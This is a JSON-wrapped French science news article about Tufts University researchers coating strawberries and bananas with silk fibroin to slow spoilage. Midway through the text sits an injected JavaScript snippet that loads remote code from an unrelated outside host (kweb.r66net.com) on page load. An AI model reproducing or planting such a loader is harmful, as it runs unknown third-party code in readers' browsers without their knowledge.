{"title": "Gaspillage alimentaire : de la soie pour conserver nos fruits et legumes", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-05-13", "content": "Des chercheurs americains pensent avoir trouve la solution au probleme de deterioration des fruits et legumes. Pour lutter contre le gaspillage et mieux conserver ces aliments pour le moins delicats, ils proposent de les enduire d'une solution de soie qui serait biocompatible, inodore et invisible. Article paru le 10 mai 2016 Selon l'Organisation des Nations unies pour l'alimentation et l' agriculture  ( FAO ), la moitie des cultures de  fruits et legumes  du monde est perdue quelque part, le long de la chaine d'approvisionnement. Des pertes essentiellement dues au fait que ces denrees sont particulierement fragiles et susceptibles de se deteriorer prematurement. Des methodes de refrigeration peuvent etre mises en oeuvre pour contrer le probleme. Cependant, celles-ci restent complexes et couteuses. De plus, elles sont parfois dommageables pour les qualites nutritionnelles et gustatives des aliments. La solution proposee par des chercheurs de la  Tufts University  (Massachusetts, Etats-Unis) dans les colonnes de  Scientific Reports  ressemble, quant a elle, a un miracle. Ils viennent en effet de demontrer que des fruits recouverts d'une  fine pellicule de soie  restaient frais pendant plus d'une semaine, sans avoir du tout recours a la refrigeration. Une solution naturelle,  biocompatible , fabriquee a partir d'eau et qui ne laisse ni odeur ni trace tant la pellicule de soie necessaire est fine. Pour mieux comprendre, il est utile de rappeler que la soie est synthetisee naturellement par les  araignees , des papillons et d'autres  insectes . Les brins de soie sont essentiellement composes de fibroine, une proteine  fibreuse  presentant une structure cristalline  liquide . Les proprietes tout a fait particulieres de la soie la rendent etonnamment resistante. Par ailleurs, comme la fibroine est insoluble, elle est susceptible de stabiliser et de proteger d'autres materiaux tout en etant biocompatible et  biodegradable . La soie est une fibre d'origine animale produite, entre autres, par le ver a soie. Naturelle, biocompatible, biodegradable, inodore et invisible (si l'on utilise l'epaisseur conseillee par les chercheurs americains), elle constituerait une solution ideale pour aider a la conservation de nos fruits et legumes. (c) Kuebi, Wikipedia, CC by-sa 3.0                               Des fraises et des bananes efficacement protegees par de la soie Au cours de leur etude, les chercheurs de la  Tufts University  ont plonge, jusqu'a quatre fois de suite, des  fraises  fraichement cueillies dans une solution contenant 1 % de proteines de fibroine de soie. Puis, ils ont traite les  fruits  ainsi recouverts de soie sous vide et a la  vapeur d'eau  pendant differents laps de temps. Objectif : creer un nombre variable de structures en feuillets dits <<  beta  >> au sein du revetement car, plus le traitement est long, plus on observe de feuillets beta et plus le revetement de soie est robuste. Les chercheurs de la  Tufts University  se sont concentres sur des couches d'une epaisseur comprise entre 27 et 35  microns .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les  fraises  ainsi traitees ont ensuite ete stockees a temperature ambiante, tout comme des fraises non traitees, destinees a servir de temoins. Sept jours plus tard, les fraises traitees etaient toujours aussi juteuses et fermes qu'un premier jour ! Les fraises non traitees, quant a elles, avaient perdu de leurs  couleurs  et s'etaient deshydratees. Un phenomene que les chercheurs de la  Tufts University  expliquent ainsi : le revetement de soie a rendu les fraises moins permeables au  dioxyde de carbone  et a l' oxygene , ce qui a ralenti leur deterioration. Des experiences similaires ont ete menees sur des  bananes , des  fruits  qui sont capables de murir apres la recolte. Dans ce cas, il a ete observe que le revetement de soie a diminue le taux de maturation tout en empechant la  peau des bananes  de ramollir, favorisant ainsi la fermete du fruit. Si rien n'est dit concernant le gout des bananes ainsi traitees, les chercheurs de la  Tufts University  envisagent deja des  applications  plus poussees a leur procede. Des agents therapeutiques pourraient en effet etre facilement ajoutes a la solution de soie afin de donner aux fruits une  fonction therapeutique  sans avoir recours a des procedes chimiques complexes. La soie, assez solide pour arreter les balles !                       Si l'on se fait tirer dessus, est-ce qu'il vaut mieux porter un gilet pare-balles en soie ou bien en acier ? La bonne solution n'est pas forcement celle que l'on imagine... C'est ce que nous explique la chaine Discovery Science au cours de cette video.                                       ", "theme": "sciences"}